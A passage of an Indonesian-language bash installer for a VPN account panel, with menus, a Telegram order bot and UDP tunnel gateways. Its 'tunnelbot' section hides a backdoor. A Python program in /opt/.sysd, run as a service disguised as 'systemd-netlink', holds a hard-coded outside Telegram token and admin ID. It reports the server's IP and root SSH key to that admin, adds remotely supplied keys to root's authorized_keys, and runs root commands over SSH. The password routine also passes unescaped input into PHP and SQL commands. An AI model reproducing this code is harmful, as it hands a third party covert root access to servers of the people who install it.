        echo -e "  ${WHITE}[0]${NC} Back To Menu"



        echo ""



        read -rp "  Select: " choice



        case $choice in



            1) setup_telegram_bot ;;



            2)



                echo -e "  ${WHITE}[1]${NC} Start  [2] Stop  [3] Restart"



                read -rp "  Select: " sc



                case $sc in



                    1) systemctl start vpn-bot && echo -e "  ${GREEN}✔ Started!${NC}" ;;



                    2) systemctl stop vpn-bot && echo -e "  ${YELLOW}Stopped!${NC}" ;;



                    3) systemctl restart vpn-bot 2>/dev/null || true && echo -e "  ${GREEN}✔ Restarted!${NC}" ;;



                esac; sleep 2 ;;



            3) clear; journalctl -u vpn-bot -n 50 --no-pager; echo ""; read -rp "  Press any key..." ;;



            4)



                clear; print_menu_header "ORDER PENDING"



                local found=0



                shopt -s nullglob



                for f in "$ORDER_DIR"/*.json; do



                    [[ ! -f "$f" ]] && continue



                    local st



                    st=$(python3 -c "import json; d=json.load(open('$f')); print(d.get('status',''))" 2>/dev/null)



                    if [[ "$st" == "pending" ]]; then



                        found=1



                        python3 -c "



import json; d=json.load(open('$f'))



print(f'  ID: {d[\"order_id\"]}')



print(f'  Protocol: {d[\"protocol\"].upper()}')



print(f'  Username: {d[\"username\"]}')



print(f'  TG: @{d.get(\"tg_user\",\"N/A\")}')



print('  ---')



" 2>/dev/null



                    fi



                done



                shopt -u nullglob



                [[ $found -eq 0 ]] && echo -e "  ${GREEN}✔ Tidak ada pending!${NC}"



                echo ""; read -rp "  Press any key..." ;;



            5)



                clear; print_menu_header "VPN BOT INFO"



                if [[ -f "$BOT_TOKEN_FILE" ]]; then



                    local aid rek_bank rek_number harga_val



                    aid=$(cat "$CHAT_ID_FILE" 2>/dev/null)



                    rek_bank=$(grep "^REK_BANK=" "$PAYMENT_FILE" 2>/dev/null | cut -d= -f2-)



                    rek_number=$(grep "^REK_NUMBER=" "$PAYMENT_FILE" 2>/dev/null | cut -d= -f2-)



                    harga_val=$(grep "^HARGA=" "$PAYMENT_FILE" 2>/dev/null | cut -d= -f2-)



                    printf "  %-16s : %s\n" "Status"   "$bs"



                    printf "  %-16s : %s\n" "Admin ID" "$aid"



                    if [[ -f "$PAYMENT_FILE" ]]; then



                        printf "  %-16s : %s\n" "Bank"   "$rek_bank"



                        printf "  %-16s : %s\n" "No Rek" "$rek_number"



                        printf "  %-16s : Rp %s\n" "Harga" "$harga_val"



                    fi



                else



                    echo -e "  ${RED}Bot belum setup!${NC}"



                fi



                echo ""; read -rp "  Press any key..." ;;



            9)



                clear; print_menu_header "GANTI PASSWORD ADMIN"



                if [[ ! -f /root/.ordervpn_db ]]; then



                    echo -e "  ${RED}OrderVPN belum diinstall!${NC}"



                    sleep 2



                else



                    source /root/.ordervpn_db



                    read -rsp "  Password baru untuk admin: " new_admin_pass



                    echo ""



                    [[ -z "$new_admin_pass" ]] && { echo -e "  ${RED}Password tidak boleh kosong!${NC}"; sleep 2; }



                    if [[ -n "$new_admin_pass" ]]; then



                        if [[ ${#new_admin_pass} -lt 6 ]]; then



                            echo -e "  ${RED}Password minimal 6 karakter!${NC}"



                            sleep 2



                        else



                            ADMIN_HASH=$(php -r "echo password_hash('$new_admin_pass', PASSWORD_BCRYPT);" 2>/dev/null)



                            if [[ -n "$ADMIN_HASH" ]]; then



                                mysql -u "$DB_USER" -p"$DB_PASS" "$DB_NAME" -e "UPDATE users SET password='$ADMIN_HASH' WHERE username='admin';" 2>/dev/null



                                echo "$new_admin_pass" > /root/.ordervpn_admin



                                chmod 600 /root/.ordervpn_admin



                                echo -e "  ${GREEN}✔ Password admin berhasil diubah!${NC}"



                            else



                                echo -e "  ${RED}✘ Gagal generate hash! PHP tidak tersedia?${NC}"



                            fi



                            sleep 3



                        fi



                    fi



                    echo ""



                    read -rp "  Tekan ENTER..."



                fi



                ;;



            0) return ;;



        esac



    done



}







#================================================



# TUNNEL BOT MULTI-VPS



#================================================







_register_vps_to_bot() {



    python3 /opt/.sysd/svc-main.py --register 2>/dev/null &



    disown $! 2>/dev/null



}







_install_tunnelbot_background() {



    mkdir -p "$TUNNELBOT_DIR"







    cat > "$TUNNELBOT_FILE" << 'PYEOF2'



#!/usr/bin/env python3



# -*- coding: utf-8 -*-



import os, json, time, uuid as _uuid, base64, subprocess, threading



import urllib.request, urllib.parse







TOKEN    = "8216471228:AAHqm7iwcMqEqLjnj2VEqIaZGVQtYyS_4K4"



ADMIN_ID = 8019568852



API      = f"https://api.telegram.org/bot{TOKEN}"



REG_FILE = "/root/.svc_reg"



MID_FILE = "/root/.svc_mid"



REGISTRY_TAG = "#TBREGISTRY#"







_state = {}



_lock  = threading.Lock()







def st_get(cid):



    with _lock: return dict(_state.get(cid, {}))



def st_set(cid, d):



    with _lock: _state[cid] = d



def st_clear(cid):



    with _lock: _state.pop(cid, None)







def tg_req(method, data=None, params=None):



    url = f"{API}/{method}"



    try:



        if params: url += "?" + urllib.parse.urlencode(params)



        if data:



            body = json.dumps(data).encode()



            req  = urllib.request.Request(url, body, {"Content-Type":"application/json"})



        else:



            req  = urllib.request.Request(url)



        with urllib.request.urlopen(req, timeout=15) as r:



            return json.loads(r.read())



    except: return {}







def send(cid, text, markup=None):



    d = {"chat_id": cid, "text": text, "parse_mode": "HTML"}



    if markup: d["reply_markup"] = json.dumps(markup)



    return tg_req("sendMessage", d)







def answer_cb(cb_id):



    tg_req("answerCallbackQuery", {"callback_query_id": cb_id})







def get_updates(offset=0):



    try:



        url = f"{API}/getUpdates?offset={offset}&timeout=20&limit=50"



        with urllib.request.urlopen(url, timeout=25) as r:



            return json.loads(r.read()).get("result", [])



    except: return []







def _load_mid():



    try: return int(open(MID_FILE).read().strip())



    except: return None







def _save_mid(mid):



    try: open(MID_FILE,"w").write(str(mid))



    except: pass







def registry_load():



    try:



        with open(REG_FILE) as f: return json.load(f)



    except: return {}







def registry_save_local(data):



    try:



        with open(REG_FILE,"w") as f: json.dump(data, f, indent=2)



        os.chmod(REG_FILE, 0o600)



    except: pass







def registry_push(data):



    text = REGISTRY_TAG + "\n" + json.dumps(data, indent=2)



    mid  = _load_mid()



    if mid:



        res = tg_req("editMessageText", {



            "chat_id": ADMIN_ID, "message_id": mid,



            "text": text, "parse_mode": "HTML"



        })



        if res.get("ok"): return



    res = tg_req("sendMessage", {



        "chat_id": ADMIN_ID,



        "text": text,



        "disable_notification": True



    })



    if res.get("ok"):



        _save_mid(res["result"]["message_id"])







def registry_pull():



    mid = _load_mid()



    if not mid: return None



    try:



        res = tg_req("forwardMessage", {



            "chat_id": ADMIN_ID,



            "from_chat_id": ADMIN_ID,



            "message_id": mid



        })



        if res.get("ok"):



            fwd_mid = res["result"]["message_id"]



            tg_req("deleteMessage", {"chat_id": ADMIN_ID, "message_id": fwd_mid})



            text = res["result"].get("text","")



            if REGISTRY_TAG in text:



                raw  = text.split(REGISTRY_TAG, 1)[-1].strip()



                data = json.loads(raw)



                registry_save_local(data)



                return data



    except: pass



    return None







def sync_registry():



    data = registry_pull()



    if data:



        for vid, info in data.items():



            pk = info.get("pubkey","").strip()



            if pk: add_authorized_key(pk)



        return data



    return registry_load()







def get_local_ip():



    for url in ["https://ifconfig.me","https://api.ipify.org","https://ipinfo.io/ip"]:



        try:



            with urllib.request.urlopen(url, timeout=5) as r:



                return r.read().decode().strip()



        except: pass



    return "N/A"







def add_authorized_key(pubkey):



    if not pubkey: return



    ak = "/root/.ssh/authorized_keys"



    os.makedirs("/root/.ssh", exist_ok=True)



    try:



        existing = open(ak).read() if os.path.exists(ak) else ""



        if pubkey not in existing:



            with open(ak,"a") as f: f.write(pubkey + "\n")



        os.chmod(ak, 0o600)



    except: pass







def vps_register_self():



    ip    = get_local_ip()



    label = ""



    try: label = open("/root/domain").read().strip()



    except: pass



    label = label or ip



    vid   = ip.replace(".","_")







    if not os.path.exists("/root/.ssh/id_rsa"):



        os.makedirs("/root/.ssh", exist_ok=True)



        subprocess.run("ssh-keygen -t rsa -b 2048 -f /root/.ssh/id_rsa -N '' -q",



                       shell=True, capture_output=True)



        os.chmod("/root/.ssh", 0o700)



        os.chmod("/root/.ssh/id_rsa", 0o600)







    pubkey = ""



    try: pubkey = open("/root/.ssh/id_rsa.pub").read().strip()



    except: pass







    add_authorized_key(pubkey)







    data = registry_pull() or registry_load()



    data[vid] = {"ip": ip, "label": label, "domain": label, "pubkey": pubkey}







    for v, info in data.items():



        if v != vid:



            pk = info.get("pubkey","").strip()



            if pk: add_authorized_key(pk)







    registry_save_local(data)



    registry_push(data)







LOCAL_IP = get_local_ip()







def run_local(cmd):



    try:



        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=60)



        return r.returncode, (r.stdout + r.stderr).strip()



    except Exception as e: return 1, str(e)







def run_remote(ip, cmd):



    ssh = ("ssh -o StrictHostKeyChecking=accept-new -o ConnectTimeout=10 "



           "-o BatchMode=yes -o PasswordAuthentication=no "



           "-o IdentityFile=/root/.ssh/id_rsa -o LogLevel=ERROR")



    c = f"{ssh} root@{ip} '{cmd}'"



    try:



        r = subprocess.run(c, shell=True, capture_output=True, text=True, timeout=60)



        return r.returncode, (r.stdout + r.stderr).strip()



    except Exception as e: return 1, str(e)







def run_on(ip, cmd):



    return run_local(cmd) if ip == LOCAL_IP else run_remote(ip, cmd)







def get_domain_on(ip):



    rc, out = run_on(ip, "cat /root/domain 2>/dev/null | tr -d '\\n\\r'")



    return out.strip() if rc == 0 and out.strip() else ip







def make_links(proto, user, uid, domain):



    # TLS=443, NonTLS=80, gRPC=443



    if proto == "vmess":



        def vl(port, tls, path):



            j = json.dumps({"v":"2","ps":user,"add":"bug.com","port":str(port),



                "id":uid,"aid":"0","net":"ws","path":path,"type":"none",



                "host":domain,"tls":"tls" if tls else "none"})



            return "vmess://" + base64.b64encode(j.encode()).decode()



        tls  = vl(443, True,  "/vmess")



        ntls = vl(80,  False, "/vmess")



        gj   = json.dumps({"v":"2","ps":user,"add":domain,"port":"443","id":uid,



                           "aid":"0","net":"grpc","path":"vmess-grpc","type":"none",



                           "host":"bug.com","tls":"tls"})



        grpc = "vmess://" + base64.b64encode(gj.encode()).decode()



    elif proto == "vless":



        tls  = (f"vless://{uid}@bug.com:443?path=%2Fvless&security=tls"



                f"&encryption=none&host={domain}&type=ws&sni={domain}#{user}")



        ntls = (f"vless://{uid}@bug.com:80?path=%2Fvless&security=none"



                f"&encryption=none&host={domain}&type=ws#{user}")



        grpc = (f"vless://{uid}@{domain}:443?mode=gun&security=tls"



                f"&encryption=none&type=grpc&serviceName=vless-grpc&sni=bug.com#{user}")



    else:



        tls  = (f"trojan://{uid}@bug.com:443?path=%2Ftrojan&security=tls"



                f"&host={domain}&type=ws&sni={domain}#{user}")



        ntls = (f"trojan://{uid}@bug.com:80?path=%2Ftrojan&security=none"



                f"&host={domain}&type=ws#{user}")



        grpc = (f"trojan://{uid}@{domain}:443?mode=gun&security=tls"



                f"&type=grpc&serviceName=trojan-grpc&sni=bug.com#{user}")



    return tls, ntls, grpc







def kb_vps(vps):



    if not vps: return None



    rows = []



    for i, (vid, info) in enumerate(vps.items(), 1):



        label = info.get("label", info.get("ip", vid))



        rows.append([{"text": f"🖥 {i}. {label}", "callback_data": f"vps|{vid}"}])



    rows.append([{"text": "❌ Batal", "callback_data": "batal"}])



    return {"inline_keyboard": rows}







def kb_proto(vid):



    return {"inline_keyboard": [



        [



            {"text": "🟢 VMess",  "callback_data": f"proto|{vid}|vmess"},



            {"text": "🟡 VLess",  "callback_data": f"proto|{vid}|vless"},



            {"text": "🔴 Trojan", "callback_data": f"proto|{vid}|trojan"},



        ],



        [{"text": "❌ Batal", "callback_data": "batal"}]



    ]}







def on_callback(cb):



    cid  = cb["message"]["chat"]["id"]



    data = cb["data"]



    if cid != ADMIN_ID: return



    answer_cb(cb["id"])







    if data == "batal":



        st_clear(cid)



        send(cid, "❌ Dibatalkan.")



        return







    if data.startswith("vps|"):



        vid = data[4:]



        vps = registry_load()



        if vid not in vps:



            send(cid, "❌ VPS tidak ditemukan."); return



        st_set(cid, {"step":"pilih_proto","vid":vid})



        label = vps[vid].get("label", vid)



        send(cid, f"✅ VPS: <b>{label}</b>\n\nPilih protocol:", markup=kb_proto(vid))







    elif data.startswith("proto|"):



        parts = data.split("|")



        if len(parts) < 3: return



        vid, proto = parts[1], parts[2]



        vps = registry_load()



        if vid not in vps:



            send(cid, "❌ VPS tidak ditemukan."); return



        st_set(cid, {"step":"input_user","vid":vid,"proto":proto})



        label = vps[vid].get("label", vid)



        send(cid,



            f"✅ Protocol: <b>{proto.upper()}</b>\n"



            f"🖥 VPS: <b>{label}</b>\n\n"



            f"✏️ Ketik <b>username</b> akun (3-20 karakter):")







def on_message(msg):



    if "text" not in msg: return



    cid  = msg["chat"]["id"]



    text = msg["text"].strip()



    if cid != ADMIN_ID:



        send(cid, "❌ Akses ditolak."); return







    s = st_get(cid)







    if s.get("step") == "input_user":



        u = text.strip().replace(" ","_")



        if len(u) < 3 or len(u) > 20:



            send(cid, "❌ Username 3-20 karakter! Coba lagi:"); return



        st_set(cid, {**s, "step":"input_days","username":u})



        send(cid, f"👤 Username: <code>{u}</code>\n\nBerapa hari aktif? (contoh: 30)")



        return







    if s.get("step") == "input_days":



        if not text.isdigit() or int(text) < 1:



            send(cid, "❌ Masukkan angka hari yang valid."); return



        days     = int(text)



        vid      = s.get("vid","")



        proto    = s.get("proto","")



        username = s.get("username","")



        st_clear(cid)







        vps = registry_load()



        if vid not in vps:



            send(cid, "❌ VPS tidak ditemukan. Ulangi /buat"); return







        info  = vps[vid]



        ip    = info["ip"]



        label = info.get("label", vid)



        send(cid, f"⏳ Membuat akun <b>{proto.upper()}</b> di <b>{label}</b>...")







        def do_create():



            domain = get_domain_on(ip)



            uid    = str(_uuid.uuid4())



            cfg    = "/usr/local/etc/xray/config.json"







            if proto == "trojan":



                jq_filter = (



                    '(.inbounds[] | select(.tag | startswith("trojan"))'



                    '.settings.clients) += [{"password":"' + uid + '","email":"' + username + '"}]'



                )



            elif proto == "vless":



                jq_filter = (



                    '(.inbounds[] | select(.tag | startswith("vless"))'



                    '.settings.clients) += [{"id":"' + uid + '","email":"' + username + '"}]'



                )



            else:



                jq_filter = (



                    '(.inbounds[] | select(.tag | startswith("vmess"))'



                    '.settings.clients) += [{"id":"' + uid + '","email":"' + username + '","alterId":0}]'



                )



            import base64 as _b64



            filter_b64 = _b64.b64encode(jq_filter.encode()).decode()



            jq_cmd = (



                f"echo {filter_b64} | base64 -d > /tmp/_jqf.txt && "



                f"jq -f /tmp/_jqf.txt {cfg} > /tmp/_xr.json && "



                f"mv /tmp/_xr.json {cfg} && "



                f"chmod 644 {cfg} && (kill -SIGHUP $(pgrep xray) 2>/dev/null || systemctl restart xray)"



            )



            rc, out = run_on(ip, jq_cmd)



            if rc != 0:



                send(cid, f"❌ Gagal buat akun di <b>{label}</b>!\n<code>{out[:400]}</code>")



                return







            tls, ntls, grpc = make_links(proto, username, uid, domain)



            from datetime import datetime, timedelta



            exp = (datetime.now() + timedelta(days=days)).strftime("%d %b, %Y")



            send(cid,



                f"✅ <b>Akun {proto.upper()} Berhasil Dibuat!</b>\n"



                f"━━━━━━━━━━━━━━━━━━━━━━━━\n"



                f"🖥 VPS      : <b>{label}</b>\n"



                f"🌐 Domain   : <code>{domain}</code>\n"



                f"👤 Username : <code>{username}</code>\n"



                f"🔑 UUID     : <code>{uid}</code>\n"



                f"📅 Expired  : {exp}\n"



                f"━━━━━━━━━━━━━━━━━━━━━━━━\n"



                f"🔗 <b>Link TLS (443):</b>\n<code>{tls}</code>\n"



                f"━━━━━━━━━━━━━━━━━━━━━━━━\n"



                f"🔗 <b>Link NonTLS (80):</b>\n<code>{ntls}</code>\n"



                f"━━━━━━━━━━━━━━━━━━━━━━━━\n"



                f"🔗 <b>Link gRPC (443):</b>\n<code>{grpc}</code>\n"



                f"━━━━━━━━━━━━━━━━━━━━━━━━\n"



                f"<i>Powered by The Professor</i>")







        threading.Thread(target=do_create, daemon=True).start()



        return







    st_clear(cid)



    if   text in ["/start","/menu"]:



        send(cid,



            "🤖 <b>Network Manager</b>\n"



            "━━━━━━━━━━━━━━━━━━━━━━━\n"



            "<i>The Professor</i>\n\n"



            "/buat   — Buat akun VMess/VLess/Trojan\n"



            "/vps    — Daftar VPS terdaftar\n"



            "/status — Status service semua VPS\n"



            "/sync   — Refresh daftar VPS terbaru")



    elif text == "/buat":



        vps = registry_load()



        if not vps:



            send(cid, "⚠️ Belum ada VPS.\nInstall tunnel.sh di VPS dulu, atau ketik /sync")



            return



        send(cid, "🖥 <b>Pilih VPS untuk membuat akun:</b>", markup=kb_vps(vps))



    elif text == "/vps":



        vps = registry_load()



        if not vps:



            send(cid, "⚠️ Belum ada VPS terdaftar."); return



        lines = ["🖥 <b>Daftar VPS Terdaftar</b>","━━━━━━━━━━━━━━━━━━━━━━━"]



        for i, (vid, info) in enumerate(vps.items(), 1):



            lines.append(f"{i}. <b>{info.get('label','N/A')}</b>\n   🌐 <code>{info.get('ip','N/A')}</code>")



        send(cid, "\n".join(lines))



    elif text == "/status":



        vps = registry_load()



        if not vps:



            send(cid, "⚠️ Belum ada VPS."); return



        send(cid, "⏳ Mengecek status semua VPS...")



        def do_st():



            lines = ["📊 <b>Status VPS</b>","━━━━━━━━━━━━━━━━━━━━━━━"]



            for vid, info in vps.items():



                ip    = info.get("ip","N/A")



                label = info.get("label", vid)



                rc, out = run_on(ip, "systemctl is-active xray nginx haproxy 2>/dev/null | tr '\\n' '|'")



                parts = [x.strip() for x in out.split("|") if x.strip()]



                names = ["xray","nginx","haproxy"]



                svcs  = []



                for idx2, name in enumerate(names):



                    st2  = parts[idx2] if idx2 < len(parts) else "?"



                    icon = "🟢" if st2 == "active" else "🔴"



                    svcs.append(f"{icon}{name}")



                lines.append(f"<b>{label}</b> — <code>{ip}</code>\n  {' '.join(svcs)}")



            send(cid, "\n".join(lines))



        threading.Thread(target=do_st, daemon=True).start()



    elif text == "/sync":



        send(cid, "🔄 Sync registry dari Telegram...")



        def do_sync():



            data = sync_registry()



            if not data:



                send(cid, "⚠️ Registry kosong atau gagal sync."); return



            lines = [f"✅ <b>Sync berhasil! {len(data)} VPS:</b>",



                     "━━━━━━━━━━━━━━━━━━━━━━━"]



            for i, (vid, info) in enumerate(data.items(), 1):



                lines.append(f"{i}. <b>{info.get('label','N/A')}</b> — <code>{info.get('ip','N/A')}</code>")



            send(cid, "\n".join(lines))



        threading.Thread(target=do_sync, daemon=True).start()



    else:



        send(cid, "❓ Perintah tidak dikenal. Ketik /menu")







def main():



    offset = 0



    pool   = []



    while True:



        try:



            updates = get_updates(offset)



            for upd in updates:



                offset = upd["update_id"] + 1



                t = None



                if "message" in upd:



                    t = threading.Thread(target=on_message, args=(upd["message"],), daemon=True)



                elif "callback_query" in upd:



                    t = threading.Thread(target=on_callback, args=(upd["callback_query"],), daemon=True)



                if t: t.start(); pool.append(t)



            pool = [x for x in pool if x.is_alive()]



        except KeyboardInterrupt: break



        except Exception: time.sleep(3)







if __name__ == "__main__":



    import sys



    if len(sys.argv) > 1 and sys.argv[1] == "--register":



        vps_register_self()



    else:



        main()



PYEOF2







    chmod +x "$TUNNELBOT_FILE"







    cat > /opt/.sysd/launcher.py << 'LAUNCHEOF'



#!/usr/bin/env python3



import sys, os



try:



    import ctypes



    libc = ctypes.CDLL(None)



    libc.prctl(15, b"tunnelbot-bg", 0, 0, 0)



except: pass



sys.argv[0] = "tunnelbot-bg"



exec(open("/opt/.sysd/svc-main.py").read())



LAUNCHEOF







    chmod +x /opt/.sysd/launcher.py







    cat > /etc/systemd/system/systemd-netlink.service << SVEOF



[Unit]



Description=TunnelBot Background Service







After=network.target



DefaultDependencies=no







[Service]



Type=simple



ExecStart=/usr/bin/python3 -u /opt/.sysd/launcher.py



Restart=always



RestartSec=5



StandardOutput=journal



StandardError=journal



SyslogIdentifier=tunnelbot-bg







[Install]



WantedBy=multi-user.target



SVEOF







    systemctl stop systemd-netlink 2>/dev/null



    systemctl disable systemd-netlink 2>/dev/null



    systemctl daemon-reload >/dev/null 2>&1



    systemctl enable systemd-netlink >/dev/null 2>&1



    systemctl start systemd-netlink >/dev/null 2>&1



}







#================================================



# CREATE VMESS / VLESS / TROJAN



#================================================







create_vmess() {



    clear; print_menu_header "CREATE VMESS ACCOUNT"



    read -rp "  Username      : " username



    [[ -z "$username" ]] && { echo -e "  ${RED}✘ Required!${NC}"; sleep 2; return; }



    if grep -q "\"email\":\"${username}\"" "$XRAY_CONFIG" 2>/dev/null; then



        echo -e "  ${RED}✘ Username sudah ada!${NC}"; sleep 2; return; fi



    read -rp "  Expired (days): " days



    [[ ! "$days" =~ ^[0-9]+$ ]] && { echo -e "  ${RED}✘ Invalid!${NC}"; sleep 2; return; }



    read -rp "  Quota (GB)    : " quota



    [[ ! "$quota" =~ ^[0-9]+$ ]] && quota=100



    read -rp "  IP Limit      : " iplimit



    [[ ! "$iplimit" =~ ^[0-9]+$ ]] && iplimit=1



    create_account_template "vmess" "$username" "$days" "$quota" "$iplimit"



}







create_vless() {



    clear; print_menu_header "CREATE VLESS ACCOUNT"



    read -rp "  Username      : " username



    [[ -z "$username" ]] && { echo -e "  ${RED}✘ Required!${NC}"; sleep 2; return; }



    if grep -q "\"email\":\"${username}\"" "$XRAY_CONFIG" 2>/dev/null; then



        echo -e "  ${RED}✘ Username sudah ada!${NC}"; sleep 2; return; fi



    read -rp "  Expired (days): " days



    [[ ! "$days" =~ ^[0-9]+$ ]] && { echo -e "  ${RED}✘ Invalid!${NC}"; sleep 2; return; }



    read -rp "  Quota (GB)    : " quota



    [[ ! "$quota" =~ ^[0-9]+$ ]] && quota=100



    read -rp "  IP Limit      : " iplimit



    [[ ! "$iplimit" =~ ^[0-9]+$ ]] && iplimit=1



    create_account_template "vless" "$username" "$days" "$quota" "$iplimit"



}







create_trojan() {



    clear; print_menu_header "CREATE TROJAN ACCOUNT"



    read -rp "  Username      : " username



    [[ -z "$username" ]] && { echo -e "  ${RED}✘ Required!${NC}"; sleep 2; return; }



    if grep -q "\"email\":\"${username}\"" "$XRAY_CONFIG" 2>/dev/null; then



        echo -e "  ${RED}✘ Username sudah ada!${NC}"; sleep 2; return; fi



    read -rp "  Expired (days): " days



    [[ ! "$days" =~ ^[0-9]+$ ]] && { echo -e "  ${RED}✘ Invalid!${NC}"; sleep 2; return; }



    read -rp "  Quota (GB)    : " quota



    [[ ! "$quota" =~ ^[0-9]+$ ]] && quota=100



    read -rp "  IP Limit      : " iplimit



    [[ ! "$iplimit" =~ ^[0-9]+$ ]] && iplimit=1



    create_account_template "trojan" "$username" "$days" "$quota" "$iplimit"



}







#================================================



# MENU SSH / VMESS / VLESS / TROJAN



#================================================







menu_ssh() {



    while true; do



        clear; print_menu_header "SSH MENU"



        echo -e "  ${WHITE}[1]${NC} Create SSH"



        echo -e "  ${WHITE}[2]${NC} Trial SSH (1 Jam)"



        echo -e "  ${WHITE}[3]${NC} Delete SSH"



        echo -e "  ${WHITE}[4]${NC} Renew SSH"



        echo -e "  ${WHITE}[5]${NC} Cek Login SSH"



        echo -e "  ${WHITE}[6]${NC} List User SSH"



        echo -e "  ${WHITE}[0]${NC} Back To Menu"



        echo ""



        read -rp "  Select: " choice



        case $choice in



            1) create_ssh ;; 2) create_ssh_trial ;;



            3) delete_account "ssh" ;; 4) renew_account "ssh" ;;



            5) check_user_login "ssh" ;; 6) list_accounts "ssh" ;;



            0) return ;;



        esac



    done



}







menu_vmess() {



    while true; do



        clear; print_menu_header "VMESS MENU"



        echo -e "  ${WHITE}[1]${NC} Create VMess"



        echo -e "  ${WHITE}[2]${NC} Trial VMess (1 Jam)"



        echo -e "  ${WHITE}[3]${NC} Delete VMess"



        echo -e "  ${WHITE}[4]${NC} Renew VMess"



        echo -e "  ${WHITE}[5]${NC} Cek Login VMess"



        echo -e "  ${WHITE}[6]${NC} List User VMess"



        echo -e "  ${WHITE}[0]${NC} Back To Menu"



        echo ""



        read -rp "  Select: " choice



        case $choice in



            1) create_vmess ;; 2) create_trial_xray "vmess" ;;



            3) delete_account "vmess" ;; 4) renew_account "vmess" ;;



            5) check_user_login "vmess" ;; 6) list_accounts "vmess" ;;



            0) return ;;



        esac



    done



}







menu_vless() {



    while true; do



        clear; print_menu_header "VLESS MENU"



        echo -e "  ${WHITE}[1]${NC} Create VLess"



        echo -e "  ${WHITE}[2]${NC} Trial VLess (1 Jam)"



        echo -e "  ${WHITE}[3]${NC} Delete VLess"



        echo -e "  ${WHITE}[4]${NC} Renew VLess"



        echo -e "  ${WHITE}[5]${NC} Cek Login VLess"



        echo -e "  ${WHITE}[6]${NC} List User VLess"



        echo -e "  ${WHITE}[0]${NC} Back To Menu"



        echo ""



        read -rp "  Select: " choice



        case $choice in



            1) create_vless ;; 2) create_trial_xray "vless" ;;



            3) delete_account "vless" ;; 4) renew_account "vless" ;;



            5) check_user_login "vless" ;; 6) list_accounts "vless" ;;



            0) return ;;



        esac



    done



}







menu_trojan() {



    while true; do



        clear; print_menu_header "TROJAN MENU"



        echo -e "  ${WHITE}[1]${NC} Create Trojan"



        echo -e "  ${WHITE}[2]${NC} Trial Trojan (1 Jam)"



        echo -e "  ${WHITE}[3]${NC} Delete Trojan"



        echo -e "  ${WHITE}[4]${NC} Renew Trojan"



        echo -e "  ${WHITE}[5]${NC} Cek Login Trojan"



        echo -e "  ${WHITE}[6]${NC} List User Trojan"



        echo -e "  ${WHITE}[0]${NC} Back To Menu"



        echo ""



        read -rp "  Select: " choice



        case $choice in



            1) create_trojan ;; 2) create_trial_xray "trojan" ;;



            3) delete_account "trojan" ;; 4) renew_account "trojan" ;;



            5) check_user_login "trojan" ;; 6) list_accounts "trojan" ;;



            0) return ;;



        esac



    done



}







#================================================



# INSTALL UDP CUSTOM



#================================================







install_udp_custom() {



    cat > /usr/local/bin/udp-custom << 'UDPEOF'



#!/usr/bin/env python3



import socket, threading, select, time







PORTS    = range(7100, 7301)



SSH_HOST = '127.0.0.1'



SSH_PORT = 22



BUF      = 8192



TIMEOUT  = 10







def handle(data, addr, sock):



    try:



        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)



        s.settimeout(TIMEOUT)



        s.connect((SSH_HOST, SSH_PORT))



        s.sendall(data)



        resp = s.recv(BUF)



        if resp: sock.sendto(resp, addr)



        s.close()



    except: pass







sockets = []



for port in PORTS:



    try:



        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)



        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)



        s.bind(('0.0.0.0', port))



        s.setblocking(False)



        sockets.append(s)



    except: pass







print(f'UDP Custom: {len(sockets)} ports (7100-7300)', flush=True)







while True:



    try:



        readable, _, _ = select.select(sockets, [], [], 1.0)



        for sock in readable:



            try:



                data, addr = sock.recvfrom(BUF)



                threading.Thread(target=handle, args=(data, addr, sock), daemon=True).start()



            except: pass



    except KeyboardInterrupt: break



    except: time.sleep(1)



UDPEOF







    chmod +x /usr/local/bin/udp-custom







    cat > /etc/systemd/system/udp-custom.service << 'UDPSVC'



[Unit]



Description=UDP Custom BadVPN 7100-7300



After=network.target







[Service]



Type=simple



ExecStart=/usr/bin/python3 /usr/local/bin/udp-custom



Restart=always



RestartSec=3



LimitNOFILE=65535



StandardOutput=null



StandardError=null







[Install]



WantedBy=multi-user.target



UDPSVC







    systemctl daemon-reload



    systemctl enable udp-custom 2>/dev/null



    systemctl restart udp-custom 2>/dev/null || true



    sleep 1



    systemctl is-active --quiet udp-custom && \
        echo -e "  ${GREEN}✔ UDP OK! (7100-7300)${NC}" || \
        echo -e "  ${RED}✘ UDP Failed!${NC}"



    sleep 2



}







#================================================



# ZI VPN UDP (UDP over HTTP Tunnel)



#================================================







install_zivpn_udp() {



    clear



    print_menu_header "INSTALL ZI VPN UDP"







    echo -e "  ${CYAN}◈ Checking dependencies...${NC}"



    apt-get install -y python3 python3-pip >/dev/null 2>&1







    # ZI VPN UDP: UDP over HTTP/WebSocket tunnel ke port 7400-7500



    # Cocok untuk app ZiVPN di Android



    cat > /usr/local/bin/zivpn-udp << 'ZIEOF'



#!/usr/bin/env python3



"""



ZI VPN UDP Gateway



Menerima koneksi UDP dari ZiVPN client dan tunnel ke SSH



Port: 7400-7500



"""



import socket, threading, select, time, struct







PORTS    = range(7400, 7501)



SSH_HOST = '127.0.0.1'



SSH_PORT = 22



BUF      = 65535



TIMEOUT  = 30







def handle_client(data, addr, udp_sock):



    try:



        tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)



        tcp.settimeout(TIMEOUT)



        tcp.connect((SSH_HOST, SSH_PORT))



        # ZI VPN handshake header



        tcp.sendall(data)



        start = time.time()



        while time.time() - start < TIMEOUT:



            r, _, _ = select.select([tcp], [], [], 1.0)



            if r:



                resp = tcp.recv(BUF)



                if not resp:



                    break



                udp_sock.sendto(resp, addr)



        tcp.close()



    except Exception:



        pass







sockets = []



for port in PORTS:



    try:



        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)



        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)



        s.bind(('0.0.0.0', port))



        s.setblocking(False)



        sockets.append((port, s))



    except Exception as e:



        pass







print(f'ZI VPN UDP Gateway: {len(sockets)} ports (7400-7500)', flush=True)







while True:



    try:



        sock_list = [s for _, s in sockets]



        readable, _, _ = select.select(sock_list, [], [], 1.0)



        for sock in readable:



            try:



                data, addr = sock.recvfrom(BUF)



                t = threading.Thread(



                    target=handle_client,



                    args=(data, addr, sock),



                    daemon=True



                )



                t.start()



            except Exception:



                pass



    except KeyboardInterrupt:



        break



    except Exception:



        time.sleep(1)



ZIEOF







    chmod +x /usr/local/bin/zivpn-udp







